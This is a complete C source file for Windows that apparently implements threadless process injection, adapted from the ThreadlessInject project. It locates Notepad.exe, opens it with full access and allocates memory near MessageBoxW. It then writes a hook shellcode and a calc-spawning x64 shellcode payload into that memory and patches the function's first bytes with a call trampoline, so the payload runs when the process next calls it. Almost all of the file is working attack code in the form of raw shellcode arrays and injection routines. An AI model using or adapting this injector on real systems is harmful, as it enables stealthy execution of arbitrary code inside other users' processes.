#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

#include "Structs.h"

//----------------------------------------------------------------------------------------------------------------------------------------------------------

#define PRNT_WN_ERR(szWnApiName)			printf("[!] %ws Failed With Error: %d \n", szWnApiName, GetLastError());
#define PRNT_NT_ERR(szNtApiName, NtErr)		printf("[!] %ws Failed With Error: 0x%0.8X \n", szNtApiName, NtErr);

//----------------------------------------------------------------------------------------------------------------------------------------------------------

typedef struct _NTAPIFP
{
	fnNtAllocateVirtualMemory			pNtAllocateVirtualMemory;
	fnNtProtectVirtualMemory			pNtProtectVirtualMemory;
	fnNtWriteVirtualMemory				pNtWriteVirtualMemory;

} NTAPIFP, * PNTAPIFP;


NTAPIFP g_NtApi = { 0x00 };

//----------------------------------------------------------------------------------------------------------------------------------------------------------

BOOL WritePayloadBuffer(IN HANDLE hProcess, IN ULONG_PTR uAddress, IN ULONG_PTR uHookShellcode, IN SIZE_T sHookShellcodeSize, IN ULONG_PTR uPayloadBuffer, IN SIZE_T sPayloadSize) {
	
	SIZE_T		sTmpSizeVar			= sPayloadSize,
				sBytesWritten		= 0x00;
	DWORD		dwOldProtection		= 0x00;
	NTSTATUS	STATUS				= STATUS_SUCCESS;

	// Write g_HookShellcode
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, uAddress, uHookShellcode, sHookShellcodeSize, &sBytesWritten))) || sBytesWritten != sHookShellcodeSize) {
		PRNT_NT_ERR(TEXT("NtWriteVirtualMemory[1]"), STATUS);
		return FALSE;
	}

	// Write main payload after g_HookShellcode
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, (uAddress + sBytesWritten), uPayloadBuffer, sPayloadSize, &sBytesWritten))) || sBytesWritten != sPayloadSize) {
		PRNT_NT_ERR(TEXT("NtWriteVirtualMemory[2]"), STATUS);
		return FALSE;
	}

	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, &uAddress, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		PRNT_NT_ERR(TEXT("NtProtectVirtualMemory"), STATUS);
		return FALSE;
	}

	return TRUE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------------

/*
	https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L102
*/

BOOL FindMemoryHole(IN HANDLE hProcess, OUT ULONG_PTR* puAddress, IN ULONG_PTR uExportedFuncAddress, IN SIZE_T sPayloadSize) {

	NTSTATUS	STATUS		= STATUS_SUCCESS;
	ULONG_PTR	uAddress	= NULL;
	SIZE_T		sTmpSizeVar = sPayloadSize;

	// Find "uAddress" that is 0x10000 aligned and is in the range of uExportedFuncAddress - 0x70000000 to uExportedFuncAddress + 0x70000000
	// 0x70000000 is 1.75 GB, so the hole is plus or minus 1.75 GB (MAX) from the exported function address
	for (uAddress = (uExportedFuncAddress & 0xFFFFFFFFFFF70000) - 0x70000000;  uAddress < uExportedFuncAddress + 0x70000000; uAddress += 0x10000){

		if (!NT_SUCCESS((STATUS = g_NtApi.pNtAllocateVirtualMemory(hProcess, &uAddress, 0x00, &sTmpSizeVar, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)))) 
			continue;

		// Allocated an address, break
		*puAddress = uAddress;
		break;
	}

	return *puAddress ? TRUE : FALSE;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------------

/*

	x64 hook shellcode
		* https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L56
		* https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L31

start:
	0:  5b                      pop    rbx							; instead of 'pop rax'
	1:  48 83 eb 04             sub    rbx,0x4						; instead of 'sub rax,0x5'
	5:  48 83 eb 01             sub    rbx,0x1
	9:  53                      push   rbx							; instead of 'push rax'
	a:  51                      push   rcx
	b:  52                      push   rdx
	c:  41 51                   push   r9							; instead of 'push r8'
	e:  41 50                   push   r8							; instead of 'push r9'
	10: 41 53                   push   r11							; instead of 'push r10'
	12: 41 52                   push   r10							; instead of 'push r11'
	14: 48 b9 aa aa aa aa aa    movabs rcx,0xaaaaaaaaaaaaaaaa		; Place holder of the original bytes of the hooked function - instead of '0x1122334455667788'    (AT BYTE NMBR: 22)
	1b: aa aa aa
	1e: 48 89 0b                mov    QWORD PTR [rbx],rcx			; instead of '[rax]'
	21: 48 83 ec 20             sub    rsp,0x20
	25: 48 83 ec 20             sub    rsp,0x20
	29: e8 11 00 00 00          call   3f <shellcode>
	2e: 48 83 c4 40             add    rsp,0x40
	32: 41 5a                   pop    r10							; instead of 'pop r11'
	34: 41 5b                   pop    r11							; instead of 'pop r10'
	36: 41 58                   pop    r8							; instead of 'pop r9'
	38: 41 59                   pop    r9							; instead of 'pop r8'
	3a: 5a                      pop    rdx
	3b: 59                      pop    rcx
	3c: 5b                      pop    rbx							; instead of 'pop rax'
	3d: ff e3                   jmp    rbx							; instead of 'jmp rax'
shellcode:
*/


// New shellcode
// Using https://defuse.ca/online-x86-assembler.htm
unsigned char g_HookShellcode[63] = {
	0x5B, 0x48, 0x83, 0xEB, 0x04, 0x48, 0x83, 0xEB, 0x01, 0x53, 0x51,
	0x52, 0x41, 0x51, 0x41, 0x50, 0x41, 0x53, 0x41, 0x52, 0x48, 0xB9,
	0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0x48, 0x89, 0x0B,
	0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0xEC, 0x20, 0xE8, 0x11, 0x00,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5A, 0x41, 0x5B, 0x41,
	0x58, 0x41, 0x59, 0x5A, 0x59, 0x5B, 0xFF, 0xE3
};

/*
// Original shellcode
unsigned char g_HookShellcode[56] = {
	0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 
	0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9, 0x88, 0x77, 0x66, 0x55, 
	0x44, 0x33, 0x22, 0x11, 0x48, 0x89, 0x08, 0x48, 0x83, 0xEC, 0x40, 
	0xE8, 0x11, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5B, 
	0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58, 0xFF, 0xE0, 
	0x90
};
*/

VOID PatchHookShellcode(IN PVOID pAddressOfExportedFunc) {
	// ullOriginalBytes is the first 8 bytes of the hooked function (before hooking)
	unsigned long long ullOriginalBytes = *(unsigned long long*)pAddressOfExportedFunc;
	// The place holder (0xaaaaaaaaaaaaaaaa) is at the 22nd byte
	memcpy(&g_HookShellcode[22], &ullOriginalBytes, sizeof(ullOriginalBytes));
}


BOOL PatchAndInstallTrampoline(IN HANDLE hProcess, IN PVOID pAddressOfExportedFunc, IN PVOID pMainPayloadAddress) {

	NTSTATUS			STATUS					= STATUS_SUCCESS;	
	DWORD				dwOldProtection			= 0x00;
	unsigned char		uTrampoline[0x05]		= { 0xE8, 0x00, 0x00, 0x00, 0x00 };		// call <RVA>
	unsigned long		ullRVA					= (unsigned long)((ULONG_PTR)pMainPayloadAddress - ((ULONG_PTR)pAddressOfExportedFunc + sizeof(uTrampoline))); // The RVA 
	SIZE_T				sTmpSizeVar				= sizeof(uTrampoline),
						sBytesWritten			= 0x00;
	PVOID				pTmpAddress				= pAddressOfExportedFunc;

	memcpy(&uTrampoline[1], &ullRVA, sizeof(ullRVA));
	
	// Enable write access to the "pAddressOfExportedFunc" function
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, &pTmpAddress, &sTmpSizeVar, PAGE_READWRITE, &dwOldProtection)))) {
		PRNT_NT_ERR(TEXT("NtProtectVirtualMemory[1]"), STATUS);
		return FALSE;
	}

	// Patch the first 5 bytes of the "pAddressOfExportedFunc" function with the trampoline
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtWriteVirtualMemory(hProcess, pAddressOfExportedFunc, uTrampoline, sizeof(uTrampoline), &sBytesWritten))) || sBytesWritten != sizeof(uTrampoline)) {
		PRNT_NT_ERR(TEXT("NtWriteVirtualMemory"), STATUS);
		return FALSE;
	}

	// Restore the original values
	sTmpSizeVar = sizeof(uTrampoline);
	pTmpAddress = pAddressOfExportedFunc;

	// Mark the "pAddressOfExportedFunc" function as RWX section. The shellcode will restore the 5 bytes that were replaced by our trampoline, therefore it needs to be able to write to "pAddressOfExportedFunc"
	if (!NT_SUCCESS((STATUS = g_NtApi.pNtProtectVirtualMemory(hProcess, &pTmpAddress, &sTmpSizeVar, PAGE_EXECUTE_READWRITE, &dwOldProtection)))) {
		PRNT_NT_ERR(TEXT("NtProtectVirtualMemory[2]"), STATUS);
		return FALSE;
	}


	return TRUE;
}


//----------------------------------------------------------------------------------------------------------------------------------------------------------

/*
	x64 calc shellcode
	https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L17
*/
unsigned char rawData[106] = {
		0x53, 0x56, 0x57, 0x55, 0x54, 0x58, 0x66, 0x83, 0xE4, 0xF0, 0x50, 0x6A,
		0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4,
		0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10,
		0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C,
		0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B,
		0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81,
		0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C,
		0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7,
		0x48, 0x83, 0xC4, 0x68, 0x5C, 0x5D, 0x5F, 0x5E, 0x5B, 0xC3
};

BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, OUT DWORD* pdwPid, OUT HANDLE* phProcess) {

	DWORD		adwProcesses[1024 * 2],
		dwReturnLen1 = NULL,
		dwReturnLen2 = NULL,
		dwNmbrOfPids = NULL;

	HANDLE		hProcess = NULL;
	HMODULE		hModule = NULL;

	WCHAR		szProc[MAX_PATH];

	// Get the array of pid's in the system
	if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
		printf("[!] EnumProcesses Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calculating the number of elements in the array returned 
	dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

	printf("[i] Number Of Processes Detected : %d \n", dwNmbrOfPids);

	for (int i = 0; i < dwNmbrOfPids; i++) {

		// If process is NULL
		if (adwProcesses[i] != NULL) {

			// Opening a process handle 
			if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {

				// If handle is valid
				// Get a handle of a module in the process 'hProcess'.
				// The module handle is needed for 'GetModuleBaseName'
				if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
					printf("[!] EnumProcessModules Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
				}
				else {
					// if EnumProcessModules succeeded
					// get the name of 'hProcess', and saving it in the 'szProc' variable 
					if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
						printf("[!] GetModuleBaseName Failed [ At Pid: %d ] With Error : %d \n", adwProcesses[i], GetLastError());
					}
					else {
						// Perform the comparison logic
						if (wcscmp(szProcName, szProc) == 0) {
							// wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", szProc, adwProcesses[i]);
							// return by reference
							*pdwPid = adwProcesses[i];
							*phProcess = hProcess;
							break;
						}
					}
				}

				CloseHandle(hProcess);
			}
		}
	}

	// Check if pdwPid or phProcess are NULL
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}

#define TARGET_FUNC	"MessageBoxW"
#define TARGET_DLL	"USER32"
#define TARGET_PROCESS L"Notepad.exe"


int main() {

	HMODULE			hNtdll					= NULL;
	ULONG_PTR		uAddress				= NULL;
	PVOID			pExportedFuncAddress	= NULL;
	HANDLE			hProcess				= NULL;

	//proc enum
	DWORD Pid = NULL;
	//HANDLE hProcess = NULL;

	if (!GetRemoteProcessHandle(TARGET_PROCESS, &Pid, &hProcess)) {
		return -1;
	}

	wprintf(L"[+] FOUND \"%s\" - Of Pid : %d \n", TARGET_PROCESS, Pid);
	getchar();

	if (!(hNtdll = GetModuleHandle(TEXT("NTDLL"))))
		return -1;

	g_NtApi.pNtAllocateVirtualMemory	= (fnNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
	g_NtApi.pNtProtectVirtualMemory		= (fnNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
	g_NtApi.pNtWriteVirtualMemory		= (fnNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");

	if (!g_NtApi.pNtAllocateVirtualMemory || !g_NtApi.pNtProtectVirtualMemory || !g_NtApi.pNtWriteVirtualMemory)
		return -1;

	if ((pExportedFuncAddress = GetProcAddress(LoadLibrary(TEXT(TARGET_DLL)), TARGET_FUNC)) == NULL)
		return -1;

	// Patching the first shellcode with the original bytes of the target function.
	PatchHookShellcode(pExportedFuncAddress);

	printf("[i] !%s.%s : 0x%p \n", TARGET_DLL, TARGET_FUNC, pExportedFuncAddress);

	//printf("[i] Targetting Process Of PID: %d \n", PID);
	printf("[i] Targettting Process Of PID: %d \n", Pid);

	/*if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID))) {
		PRNT_WN_ERR(TEXT("OpenProcess"));
		return -1;
	}*/
	if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid))) {
		PRNT_WN_ERR(TEXT("OpenProcess"));
		return -1;
	}

	// Allocating a memory hole.
	if (!FindMemoryHole(hProcess, &uAddress, pExportedFuncAddress, sizeof(rawData) + sizeof(g_HookShellcode)))
		return -1;

	printf("[*] Found Memory Hole At : 0x%p \n", (void*)uAddress);

	// Writing both the first and the second (main) shellcode  
	if (!WritePayloadBuffer(hProcess, uAddress, g_HookShellcode, sizeof(g_HookShellcode), rawData, sizeof(rawData)))
		return -1;

	printf("[+] Injected Payload ! \n");

	printf("[i] Press <Enter> To Install The Trampoline Hook ... ");
	getchar();

	// Installing the trampoline hook at the start of the target function.
	if (!PatchAndInstallTrampoline(hProcess, pExportedFuncAddress, uAddress))
		return -1;

	printf("[+] Installed %s Hook! \n", TARGET_FUNC);


	// Now we wait for the "PID" process to call "TARGET_FUNC"
	return 0;
}